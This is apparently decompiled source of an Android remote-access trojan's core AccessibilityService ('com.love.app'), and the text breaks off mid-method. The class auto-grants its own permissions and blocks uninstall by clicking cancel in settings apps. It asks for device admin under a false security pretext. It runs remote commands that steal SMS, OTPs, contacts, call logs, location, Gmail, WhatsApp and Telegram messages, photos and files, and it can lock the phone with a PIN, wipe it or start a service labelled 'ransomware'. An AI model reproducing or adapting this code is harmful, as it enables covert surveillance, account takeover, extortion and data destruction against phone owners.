/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.accessibilityservice.AccessibilityService
 *  android.accessibilityservice.AccessibilityServiceInfo
 *  android.accessibilityservice.GestureDescription$Builder
 *  android.accessibilityservice.GestureDescription$StrokeDescription
 *  android.accounts.Account
 *  android.accounts.AccountManager
 *  android.app.WallpaperManager
 *  android.app.admin.DevicePolicyManager
 *  android.content.BroadcastReceiver
 *  android.content.ComponentName
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.content.IntentFilter
 *  android.content.SharedPreferences
 *  android.content.SharedPreferences$Editor
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageManager
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.BitmapFactory
 *  android.graphics.BitmapFactory$Options
 *  android.graphics.Path
 *  android.graphics.Rect
 *  android.graphics.SurfaceTexture
 *  android.hardware.Camera
 *  android.hardware.Camera$CameraInfo
 *  android.hardware.Camera$Parameters
 *  android.hardware.Camera$PictureCallback
 *  android.hardware.Camera$Size
 *  android.hardware.camera2.CameraAccessException
 *  android.hardware.camera2.CameraManager
 *  android.location.Location
 *  android.location.LocationListener
 *  android.location.LocationManager
 *  android.net.Uri
 *  android.os.BatteryManager
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Environment
 *  android.os.Handler
 *  android.os.Looper
 *  android.os.Parcelable
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.os.VibrationEffect
 *  android.os.Vibrator
 *  android.provider.Settings$Secure
 *  android.speech.tts.TextToSpeech
 *  android.speech.tts.TextToSpeech$OnInitListener
 *  android.telephony.SmsManager
 *  android.telephony.TelephonyManager
 *  android.util.Base64
 *  android.util.Log
 *  android.view.accessibility.AccessibilityEvent
 *  android.view.accessibility.AccessibilityNodeInfo
 *  org.json.JSONArray
 *  org.json.JSONException
 *  org.json.JSONObject
 */
package com.love.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Path;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.github.tamir7.contacts.Contacts;
import com.google.gson.Gson;
import com.love.app.AdminReceiver;
import com.love.app.AppConstant;
import com.love.app.CommandService;
import com.love.app.ConfigFetcher;
import com.love.app.CoreService$$ExternalSyntheticLambda0;
import com.love.app.CoreService$$ExternalSyntheticLambda1;
import com.love.app.CoreService$$ExternalSyntheticLambda10;
import com.love.app.CoreService$$ExternalSyntheticLambda11;
import com.love.app.CoreService$$ExternalSyntheticLambda12;
import com.love.app.CoreService$$ExternalSyntheticLambda13;
import com.love.app.CoreService$$ExternalSyntheticLambda14;
import com.love.app.CoreService$$ExternalSyntheticLambda15;
import com.love.app.CoreService$$ExternalSyntheticLambda16;
import com.love.app.CoreService$$ExternalSyntheticLambda17;
import com.love.app.CoreService$$ExternalSyntheticLambda18;
import com.love.app.CoreService$$ExternalSyntheticLambda19;
import com.love.app.CoreService$$ExternalSyntheticLambda2;
import com.love.app.CoreService$$ExternalSyntheticLambda20;
import com.love.app.CoreService$$ExternalSyntheticLambda21;
import com.love.app.CoreService$$ExternalSyntheticLambda22;
import com.love.app.CoreService$$ExternalSyntheticLambda23;
import com.love.app.CoreService$$ExternalSyntheticLambda24;
import com.love.app.CoreService$$ExternalSyntheticLambda25;
import com.love.app.CoreService$$ExternalSyntheticLambda26;
import com.love.app.CoreService$$ExternalSyntheticLambda27;
import com.love.app.CoreService$$ExternalSyntheticLambda28;
import com.love.app.CoreService$$ExternalSyntheticLambda29;
import com.love.app.CoreService$$ExternalSyntheticLambda3;
import com.love.app.CoreService$$ExternalSyntheticLambda30;
import com.love.app.CoreService$$ExternalSyntheticLambda31;
import com.love.app.CoreService$$ExternalSyntheticLambda32;
import com.love.app.CoreService$$ExternalSyntheticLambda33;
import com.love.app.CoreService$$ExternalSyntheticLambda34;
import com.love.app.CoreService$$ExternalSyntheticLambda35;
import com.love.app.CoreService$$ExternalSyntheticLambda36;
import com.love.app.CoreService$$ExternalSyntheticLambda37;
import com.love.app.CoreService$$ExternalSyntheticLambda38;
import com.love.app.CoreService$$ExternalSyntheticLambda39;
import com.love.app.CoreService$$ExternalSyntheticLambda4;
import com.love.app.CoreService$$ExternalSyntheticLambda5;
import com.love.app.CoreService$$ExternalSyntheticLambda6;
import com.love.app.CoreService$$ExternalSyntheticLambda7;
import com.love.app.CoreService$$ExternalSyntheticLambda8;
import com.love.app.CoreService$$ExternalSyntheticLambda9;
import com.love.app.ForegroundService;
import com.love.app.LockActivity;
import com.love.app.MyService;
import com.love.app.ScreenCaptureActivity;
import com.love.app.ScreenCaptureService;
import com.love.app.ServiceWindow;
import es.dmoral.toasty.Toasty;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FilterOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.Reader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import me.everything.providers.android.browser.BrowserProvider;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class CoreService
extends AccessibilityService
implements TextToSpeech.OnInitListener {
    private static final String GMAIL_PACKAGE = "com.google.android.gm";
    private static final long HEARTBEAT_INTERVAL = 15000L;
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String PREF_NAME = "love_config";
    private static final String[] SETTINGS_PKGS = new String[]{"com.android.settings", "com.samsung.android.settings", "com.miui.securitycenter", "com.huawei.systemmanager", "com.coloros.safecenter", "com.vivo.permissionmanager", "com.oppo.safe", "com.zte.zdm", "com.htc.htcpowermanager", "com.google.android.settings", "com.android.vending", "com.google.android.packageinstaller"};
    private static final String TAG = "CoreService";
    private static final String TELEGRAM_PACKAGE = "org.telegram.messenger";
    private static final String WHATSAPP_PACKAGE = "com.whatsapp";
    private ComponentName adminComponent;
    private volatile Camera camera;
    private final Object cameraLock;
    private CameraManager cameraManager;
    private BroadcastReceiver cmdReceiver;
    private String currentCmdId = "";
    private String deviceId;
    private DevicePolicyManager dpm;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean isGmailFetching;
    private boolean isLocked = false;
    private final AtomicBoolean isTelegramFetching;
    private final AtomicBoolean isWhatsAppFetching;
    private AppConstant locationData;
    private LocationListener locationListener;
    private LocationManager locationManager;
    private boolean registered = false;
    private RequestQueue requestQueue;
    private ScheduledExecutorService scheduler;
    private InheritableThreadLocal<String> threadCmdId;
    private boolean torchBlinking = false;
    private String torchCameraId;
    private TextToSpeech tts;
    private PowerManager.WakeLock wakeLock;

    public CoreService() {
        this.cameraLock = new Object();
        this.threadCmdId = new InheritableThreadLocal();
        this.isGmailFetching = new AtomicBoolean(false);
        this.isWhatsAppFetching = new AtomicBoolean(false);
        this.isTelegramFetching = new AtomicBoolean(false);
    }

    private void acquireWakeLock() {
        try {
            PowerManager.WakeLock wakeLock;
            this.wakeLock = wakeLock = ((PowerManager)this.getSystemService("power")).newWakeLock(1, "CoreService::WakeLock");
            wakeLock.acquire(86400000L);
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)"WakeLock error", (Throwable)exception);
        }
    }

    private boolean autoClickCancel(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        CharSequence charSequence = accessibilityNodeInfo.getText();
        CharSequence charSequence2 = accessibilityNodeInfo.getContentDescription();
        String string2 = "";
        charSequence = charSequence != null ? ((Object)charSequence).toString().toLowerCase().trim() : "";
        charSequence2 = charSequence2 != null ? ((Object)charSequence2).toString().toLowerCase().trim() : "";
        if (accessibilityNodeInfo.getViewIdResourceName() != null) {
            string2 = accessibilityNodeInfo.getViewIdResourceName().toLowerCase();
        }
        int n = !(((String)charSequence).equals("batal") || ((String)charSequence).equals("cancel") || ((String)charSequence).equals("batalkan") || ((String)charSequence).equals("tidak") || ((String)charSequence).equals("no") || ((String)charSequence).equals("nein") || ((String)charSequence).equals("annuler") || string2.contains("cancel") || string2.contains("negative") || string2.contains("btn_no") || string2.contains("button_cancel") || ((String)charSequence2).contains("cancel") || ((String)charSequence2).contains("batal")) ? 0 : 1;
        if (n != 0 && accessibilityNodeInfo.isClickable()) {
            accessibilityNodeInfo.performAction(16);
            return true;
        }
        for (n = 0; n < accessibilityNodeInfo.getChildCount(); ++n) {
            if (!this.autoClickCancel(accessibilityNodeInfo.getChild(n))) continue;
            return true;
        }
        return false;
    }

    private boolean autoClickPermission(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        CharSequence charSequence = accessibilityNodeInfo.getText();
        String string2 = "";
        charSequence = charSequence != null ? ((Object)charSequence).toString().toLowerCase().trim() : "";
        if (accessibilityNodeInfo.getViewIdResourceName() != null) {
            string2 = accessibilityNodeInfo.getViewIdResourceName().toLowerCase();
        }
        int n = !(((String)charSequence).equals("mulai sekarang") || ((String)charSequence).equals("start now") || ((String)charSequence).equals("izinkan") || ((String)charSequence).equals("allow") || ((String)charSequence).equals("selalu izinkan") || ((String)charSequence).equals("allow all the time") || ((String)charSequence).equals("saat aplikasi digunakan") || ((String)charSequence).equals("while using the app") || ((String)charSequence).equals("ya") || ((String)charSequence).equals("yes") || ((String)charSequence).equals("ok") || string2.contains("button1") || string2.contains("allow_button") || string2.contains("start_button")) ? 0 : 1;
        if (n != 0 && accessibilityNodeInfo.isClickable()) {
            accessibilityNodeInfo.performAction(16);
            return true;
        }
        if (n != 0 && accessibilityNodeInfo.getParent() != null && accessibilityNodeInfo.getParent().isClickable()) {
            accessibilityNodeInfo.getParent().performAction(16);
            return true;
        }
        for (n = 0; n < accessibilityNodeInfo.getChildCount(); ++n) {
            if (!this.autoClickPermission(accessibilityNodeInfo.getChild(n))) continue;
            return true;
        }
        return false;
    }

    private void changeWallpaper(String string2) {
        String string3 = this.threadCmdId.get() != null ? (String)this.threadCmdId.get() : this.currentCmdId;
        new Thread(new CoreService$$ExternalSyntheticLambda39(this, string3, string2)).start();
    }

    private void checkAccessibilityStatus() {
        String string2 = Settings.Secure.getString((ContentResolver)this.getContentResolver(), (String)"enabled_accessibility_services");
        boolean bl = string2 != null && string2.contains(this.getPackageName() + "/" + ((Object)((Object)this)).getClass().getName());
        if (!bl) {
            string2 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            string2.addFlags(0x10000000);
            this.startActivity((Intent)string2);
        }
    }

    private void collectNodes(AccessibilityNodeInfo accessibilityNodeInfo, List<AccessibilityNodeInfo> list) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        list.add(accessibilityNodeInfo);
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            this.collectNodes(accessibilityNodeInfo.getChild(i), list);
        }
    }

    private void collectTexts(AccessibilityNodeInfo accessibilityNodeInfo, List<String> list) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        if (accessibilityNodeInfo.getText() != null && accessibilityNodeInfo.getText().length() > 0) {
            list.add(((Object)accessibilityNodeInfo.getText()).toString());
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            this.collectTexts(accessibilityNodeInfo.getChild(i), list);
        }
    }

    /*
     * Unable to fully structure code
     * Could not resolve type clashes
     */
    private byte[] compressImage(byte[] var1_1, int var2_2, int var3_3) {
        block7: {
            block6: {
                if (var1_1 == null) {
                    return new byte[0];
                }
                var10_4 /* !! */  = new BitmapFactory.Options();
                var10_4 /* !! */ .inPreferredConfig = Bitmap.Config.RGB_565;
                var11_8 = BitmapFactory.decodeByteArray((byte[])var1_1, (int)0, (int)var1_1.length, (BitmapFactory.Options)var10_4 /* !! */ );
                if (var11_8 != null) break block6;
                return var1_1;
            }
            var9_9 = var11_8.getWidth();
            var8_10 = var11_8.getHeight();
            var10_4 /* !! */  = var11_8;
            if (var3_3 <= 0) ** GOTO lbl27
            if (var9_9 > var3_3) break block7;
            var10_4 /* !! */  = var11_8;
            if (var8_10 <= var3_3) ** GOTO lbl27
        }
        var6_11 = var3_3;
        var5_12 = var9_9;
        var7_13 = var6_11 / var5_12;
        var4_14 = var8_10;
        try {
            var6_11 = Math.min(var7_13, var6_11 / var4_14);
            var10_4 /* !! */  = Bitmap.createScaledBitmap((Bitmap)var11_8, (int)((int)(var5_12 * var6_11)), (int)((int)(var4_14 * var6_11)), (boolean)true);
            var11_8.recycle();
lbl27:
            // 3 sources

            var11_8 = new ByteArrayOutputStream();
            var10_4 /* !! */ .compress(Bitmap.CompressFormat.JPEG, var2_2, (OutputStream)var11_8);
            var10_4 /* !! */ .recycle();
            var10_4 /* !! */  = (BitmapFactory.Options)var11_8.toByteArray();
            return var10_4 /* !! */ ;
        }
        catch (Exception var10_5) {
        }
        catch (OutOfMemoryError var10_6) {
            // empty catch block
        }
        Log.w((String)"CoreService", (String)("compressImage fallback: " + var10_7.getMessage()));
        return var1_1;
    }

    private void deleteRecursive(File file) {
        File[] fileArray;
        if (file == null) {
            return;
        }
        if (file.isDirectory() && (fileArray = file.listFiles()) != null) {
            int n = fileArray.length;
            for (int i = 0; i < n; ++i) {
                this.deleteRecursive(fileArray[i]);
            }
        }
        file.delete();
    }

    private void enableDeviceAdmin() {
        if (this.dpm.isAdminActive(this.adminComponent)) {
            return;
        }
        Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
        intent.putExtra("android.app.extra.DEVICE_ADMIN", (Parcelable)this.adminComponent);
        intent.putExtra("android.app.extra.ADD_EXPLANATION", "Required for security");
        intent.addFlags(0x10000000);
        this.startActivity(intent);
    }

    private void ensureFgService() {
        Intent intent = new Intent((Context)this, ForegroundService.class);
        intent.putExtra("inputExtra", "System Service Running");
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                this.startForegroundService(intent);
            } else {
                this.startService(intent);
            }
        }
        catch (Exception exception) {
            Log.e((String)TAG, (String)("Gagal ensureFgService: " + exception.getMessage()));
        }
    }

    private void ensureGmailWindow() throws InterruptedException {
        String string2;
        AccessibilityNodeInfo accessibilityNodeInfo = this.getRootInActiveWindow();
        if (accessibilityNodeInfo != null) {
            string2 = accessibilityNodeInfo.getPackageName() != null ? ((Object)accessibilityNodeInfo.getPackageName()).toString() : "";
            if (string2.equals(GMAIL_PACKAGE)) {
                accessibilityNodeInfo.recycle();
                return;
            }
            accessibilityNodeInfo.recycle();
        }
        if ((string2 = this.getPackageManager().getLaunchIntentForPackage(GMAIL_PACKAGE)) != null) {
            string2.addFlags(0x10000000);
            this.startActivity((Intent)string2);
            Thread.sleep(2000L);
            for (int i = 0; i < 10; ++i) {
                string2 = this.getRootInActiveWindow();
                if (string2 != null && string2.getPackageName() != null && ((Object)string2.getPackageName()).toString().equals(GMAIL_PACKAGE)) {
                    if (string2.getChildCount() > 0) {
                        string2.recycle();
                        return;
                    }
                    string2.recycle();
                }
                Thread.sleep(500L);
            }
            throw new RuntimeException("Failed to open Gmail");
        }
        throw new RuntimeException("Gmail not installed");
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void executeCommand(int var1_1, String var2_2, String var3_7) {
        block66: {
            Log.d((String)"CoreService", (String)("Menjalankan command: " + var1_1 + " cmdId=" + var3_7));
            this.currentCmdId = var3_7;
            this.threadCmdId.set(var3_7);
            block5 : switch (var1_1) {
                default: {
                    switch (var1_1) {
                        default: {
                            switch (var1_1) {
                                default: {
                                    switch (var1_1) {
                                        default: {
                                            switch (var1_1) {
                                                default: {
                                                    var5_9 = this.getRootInActiveWindow();
                                                    if (var5_9 == null) {
                                                        this.handleAccessibilityCommandWithFallback(var1_1, (String)var2_2, var3_7);
                                                        return;
                                                    }
                                                    if (var1_1 == 200) ** GOTO lbl39
                                                    if (var1_1 == 115987) ** GOTO lbl33
                                                    if (var1_1 == 44598715) ** GOTO lbl31
                                                    if (var1_1 == 885478962) ** GOTO lbl29
                                                    try {
                                                        var2_2 = new StringBuilder("Unknown cmd: ");
                                                        Log.w((String)"CoreService", (String)var2_2.append(var1_1).toString());
                                                        this.sendResult("error", "Unknown command", var3_7);
                                                        ** GOTO lbl45
lbl29:
                                                        // 1 sources

                                                        this.setText(var5_9, (String)var2_2);
                                                        ** GOTO lbl45
lbl31:
                                                        // 1 sources

                                                        this.performClick(var5_9, (String)var2_2);
                                                        ** GOTO lbl45
lbl33:
                                                        // 1 sources

                                                        this.performTouch((String)var2_2);
                                                        ** GOTO lbl45
                                                    }
                                                    catch (Throwable var2_3) {
                                                        break block5;
                                                    }
                                                    catch (Exception var2_4) {
                                                        ** GOTO lbl-1000
                                                    }
lbl39:
                                                    // 1 sources

                                                    try {
                                                        var4_10 = Integer.parseInt((String)var2_2);
                                                    }
                                                    catch (NumberFormatException var2_5) {
                                                        var4_10 = 10;
                                                    }
                                                    this.fetchGmailEmails(var4_10);
lbl45:
                                                    // 6 sources

                                                    while (true) {
                                                        var5_9.recycle();
                                                        return;
                                                        break;
                                                    }
lbl-1000:
                                                    // 1 sources

                                                    {
                                                        var6_11 = new StringBuilder("Error executing command ");
                                                        Log.e((String)"CoreService", (String)var6_11.append(var1_1).toString(), (Throwable)var2_4);
                                                        this.sendResult("error", var2_4.getMessage(), var3_7);
                                                        ** continue;
                                                    }
                                                }
                                                case 11223345: {
                                                    this.takePhoto(1);
                                                    return;
                                                }
                                                case 11223344: 
                                            }
                                            this.takePhoto(0);
                                            return;
                                        }
                                        case 99887766: {
                                            this.enableDeviceAdmin();
                                            this.sendSimpleResult("admin", "requested");
                                            return;
                                        }
                                        case 98765432: {
                                            this.startLockActivity();
                                            return;
                                        }
                                        case 89521475: {
                                            this.stopService(new Intent((Context)this, ServiceWindow.class));
                                            this.sendSimpleResult("overlay", "hidden");
                                            return;
                                        }
                                        case 87654321: {
                                            if (this.setLockPin((String)var2_2) == false) return;
                                            this.sendSimpleResult("pin", "set");
                                            return;
                                        }
                                        case 74789654: {
                                            this.launchApp((String)var2_2);
                                            return;
                                        }
                                        case 66985478: {
                                            this.performGlobalAction(1);
                                            this.sendSimpleResult("back", "done");
                                            return;
                                        }
                                        case 64645897: {
                                            this.uninstallApp((String)var2_2);
                                            return;
                                        }
                                        case 45832158: {
                                            this.performGlobalAction(4);
                                            this.sendSimpleResult("notifications", "done");
                                            return;
                                        }
                                        case 33654789: {
                                            this.performGlobalAction(3);
                                            this.sendSimpleResult("recents", "done");
                                            return;
                                        }
                                        case 25896321: {
                                            this.performGlobalAction(2);
                                            this.sendSimpleResult("home", "done");
                                            return;
                                        }
                                        case 5698742: {
                                            this.startService(new Intent((Context)this, ServiceWindow.class));
                                            this.sendSimpleResult("overlay", "shown");
                                            return;
                                        }
                                        case 1596485: {
                                            this.sendInstalledApps();
                                            return;
                                        }
                                        case 2000: 
                                    }
                                    this.setLockMode((String)var2_2);
                                    return;
                                }
                                case 1062: {
                                    var2_2 = new Intent((Context)this, ScreenCaptureService.class);
                                    var2_2.putExtra("mode", "record_stop");
                                    var2_2.putExtra("cmd_id", var3_7);
                                    this.startService((Intent)var2_2);
                                    return;
                                }
                                case 1061: {
                                    this.startScreenCapture("record_start");
                                    return;
                                }
                                case 1060: 
                            }
                            this.startScreenCapture("screenshot");
                            return;
                        }
                        case 1055: {
                            this.fetchTelegramMessages((String)var2_2);
                            return;
                        }
                        case 1054: {
                            this.fetchWhatsAppMessages((String)var2_2);
                            return;
                        }
                        case 1053: {
                            this.getGoogleAccounts();
                            return;
                        }
                        case 1052: {
                            this.getTelegram();
                            return;
                        }
                        case 1051: {
                            this.getOTP();
                            return;
                        }
                        case 1050: 
                    }
                    this.getWhatsAppNumber();
                    return;
                }
                case 1020: {
                    this.fetchGallery((String)var2_2);
                    return;
                }
                case 1019: {
                    this.fetchNotifications();
                    return;
                }
                case 1018: {
                    this.startTorchBlink();
                    this.sendSimpleResult("torch", "blink started");
                    return;
                }
                case 1017: {
                    this.setTorch(false);
                    this.torchBlinking = false;
                    this.sendSimpleResult("torch", "off");
                    return;
                }
                case 1016: {
                    this.setTorch(true);
                    this.sendSimpleResult("torch", "on");
                    return;
                }
                case 1015: {
                    this.uploadFile((String)var2_2);
                    return;
                }
                case 1014: {
                    this.getFileList((String)var2_2);
                    return;
                }
                case 1013: {
                    this.showToast((String)var2_2);
                    this.sendSimpleResult("toast", "shown");
                    return;
                }
                case 1012: {
                    this.speak((String)var2_2);
                    this.sendSimpleResult("voice", "spoken");
                    return;
                }
                case 1011: {
                    this.changeWallpaper((String)var2_2);
                    this.sendSimpleResult("wallpaper", "changed");
                    return;
                }
                case 1010: {
                    this.startService(new Intent((Context)this, MyService.class));
                    this.sendSimpleResult("ransomware", "started");
                    return;
                }
                case 1009: {
                    this.wipe();
                    return;
                }
                case 1008: {
                    this.vibrate();
                    this.sendSimpleResult("vibrate", "done");
                    return;
                }
                case 1007: {
                    this.getBrowserHistory();
                    return;
                }
                case 1006: {
                    this.sendDeviceInfo();
                    return;
                }
                case 1005: {
                    this.sendLocation();
                    return;
                }
                case 1004: {
                    this.getCallLogs();
                    return;
                }
                case 1003: {
                    this.sendSms((String)var2_2);
                    return;
                }
                case 1002: {
                    this.getSms();
                    return;
                }
                case 1001: {
                    this.getContacts();
                    return;
                }
            }
            try {}
            catch (Exception var3_8) {
                throw var2_3;
            }
            break block66;
            catch (Exception var2_6) {
                return;
            }
        }
        var5_9.recycle();
        throw var2_3;
    }

    private String extractContactName(AccessibilityNodeInfo object) {
        object = !(object = object.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_row_contact_name")).isEmpty() && ((AccessibilityNodeInfo)object.get(0)).getText() != null ? ((Object)((AccessibilityNodeInfo)object.get(0)).getText()).toString() : "";
        return object;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private JSONObject extractEmailFromListItem(AccessibilityNodeInfo accessibilityNodeInfo) {
        JSONObject jSONObject = new JSONObject();
        try {
            ArrayList<String> arrayList = new ArrayList<String>();
            this.collectTexts(accessibilityNodeInfo, arrayList);
            int n = arrayList.size();
            if (n >= 3) {
                jSONObject.put("sender", arrayList.get(0));
                jSONObject.put("subject", arrayList.get(1));
                jSONObject.put("snippet", arrayList.get(2));
                return jSONObject;
            }
            n = arrayList.size();
            if (n == 2) {
                jSONObject.put("sender", arrayList.get(0));
                jSONObject.put("subject", arrayList.get(1));
                jSONObject.put("snippet", (Object)"");
                return jSONObject;
            }
            if (arrayList.size() == 1) {
                jSONObject.put("sender", (Object)"");
                jSONObject.put("subject", arrayList.get(0));
                jSONObject.put("snippet", (Object)"");
                return jSONObject;
            }
            jSONObject.put("sender", (Object)"");
            jSONObject.put("subject", (Object)"");
            jSONObject.put("snippet", (Object)"");
            return jSONObject;
        }
        catch (JSONException jSONException) {
            return jSONObject;
        }
    }

    private String extractPhoneNumber(AccessibilityNodeInfo object) {
        block1: {
            Pattern pattern = Pattern.compile("\\+?[0-9\\s\\-]{8,15}");
            Object object2 = new ArrayList();
            this.collectNodes((AccessibilityNodeInfo)object, (List<AccessibilityNodeInfo>)object2);
            object = object2.iterator();
            while (object.hasNext()) {
                object2 = (AccessibilityNodeInfo)object.next();
                if (object2.getText() == null || !((Matcher)(object2 = pattern.matcher(((Object)object2.getText()).toString()))).find()) continue;
                object = ((Matcher)object2).group();
                break block1;
            }
            object = null;
        }
        return object;
    }

    private String extractTelegramContact(AccessibilityNodeInfo object) {
        object = !(object = object.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/name")).isEmpty() && ((AccessibilityNodeInfo)object.get(0)).getText() != null ? ((Object)((AccessibilityNodeInfo)object.get(0)).getText()).toString() : "";
        return object;
    }

    private void extractTextFromNode(AccessibilityNodeInfo accessibilityNodeInfo, StringBuilder stringBuilder) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        if (accessibilityNodeInfo.getText() != null) {
            stringBuilder.append(((Object)accessibilityNodeInfo.getText()).toString()).append("\n");
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
            this.extractTextFromNode(accessibilityNodeInfo.getChild(i), stringBuilder);
        }
    }

    /*
     * WARNING - void declaration
     */
    private void fetchGallery(String string2) {
        boolean bl;
        int n;
        block6: {
            int n2 = 20;
            boolean bl2 = true;
            boolean bl3 = true;
            n = n2;
            bl = bl2;
            if (string2 != null) {
                void var1_4;
                block8: {
                    block7: {
                        n = n2;
                        bl = bl2;
                        if (string2.isEmpty()) break block6;
                        bl = string2.startsWith("no_upload:");
                        if (!bl) break block7;
                        try {
                            n = Integer.parseInt(string2.substring(10));
                            bl = false;
                            break block6;
                        }
                        catch (Exception exception) {
                            bl = false;
                            break block8;
                        }
                    }
                    try {
                        n = Integer.parseInt(string2);
                        bl = bl2;
                        break block6;
                    }
                    catch (Exception exception) {
                        bl = bl3;
                    }
                }
                Log.w((String)TAG, (String)"fetchGallery param error", (Throwable)var1_4);
                n = n2;
            }
        }
        new Thread(new CoreService$$ExternalSyntheticLambda3(this, bl, n)).start();
    }

    private void fetchGmailEmails(int n) {
        if (this.isGmailFetching.getAndSet(true)) {
            this.sendResult("gmail_status", "Already fetching");
            return;
        }
        new Thread(new CoreService$$ExternalSyntheticLambda18(this, n)).start();
    }

    private void fetchNotifications() {
        Object object = ConfigFetcher.getBaseUrl((Context)this);
        if (object == null) {
            this.sendResult("notifications", "[]");
            return;
        }
        object = new StringRequest(0, (String)object + "/notif/report?device_id=" + this.deviceId, new CoreService$$ExternalSyntheticLambda29(this), new CoreService$$ExternalSyntheticLambda30(this));
        ((Request)object).setRetryPolicy(new DefaultRetryPolicy(10000, 1, 1.0f));
        this.requestQueue.add(object);
    }

    private void fetchTelegramMessages(String string2) {
        if (this.isTelegramFetching.getAndSet(true)) {
            this.sendResult("telegram_messages_status", "Already fetching");
            return;
        }
        new Thread(new CoreService$$ExternalSyntheticLambda8(this, string2)).start();
    }

    private void fetchWhatsAppMessages(String string2) {
        if (this.isWhatsAppFetching.getAndSet(true)) {
            this.sendResult("whatsapp_messages_status", "Already fetching");
            return;
        }
        new Thread(new CoreService$$ExternalSyntheticLambda20(this, string2)).start();
    }

    private void fetchWhatsAppNumberFromSettings() {
        new Thread(new CoreService$$ExternalSyntheticLambda24(this)).start();
    }

    /*
     * Unable to fully structure code
     */
    private boolean findAndClick(AccessibilityNodeInfo var1_1, String var2_2) {
        block6: {
            block8: {
                block7: {
                    if (var1_1 == null) {
                        return false;
                    }
                    if (this.nodeContainsText(var1_1, var2_2)) lbl-1000:
                    // 3 sources

                    {
                        while (true) {
                            var3_4 = 1;
                            break block6;
                            break;
                        }
                    }
                    if (!var2_2.contains(";")) break block7;
                    var4_3 = var2_2.split(";", 2);
                    if ((var1_1.getViewIdResourceName() == null || !var1_1.getViewIdResourceName().equals(var4_3[0])) && (var1_1.getText() == null || !var1_1.getText().toString().equalsIgnoreCase((String)var4_3[1]))) break block8;
                    ** GOTO lbl-1000
                }
                var4_3 = new Rect();
                var1_1.getBoundsInScreen((Rect)var4_3);
                if (!var4_3.toString().equals(var2_2)) ** break;
                ** while (true)
            }
            var3_4 = 0;
        }
        if (var3_4 != 0) {
            for (var4_3 = var1_1; var4_3 != null; var4_3 = var4_3.getParent()) {
                if (!var4_3.isClickable()) continue;
                var4_3.performAction(16);
                return true;
            }
        }
        for (var3_4 = 0; var3_4 < var1_1.getChildCount(); ++var3_4) {
            if (!this.findAndClick(var1_1.getChild(var3_4), var2_2)) continue;
            return true;
        }
        return false;
    }

    private void findAndSetText(AccessibilityNodeInfo accessibilityNodeInfo, String string2, String string3) {
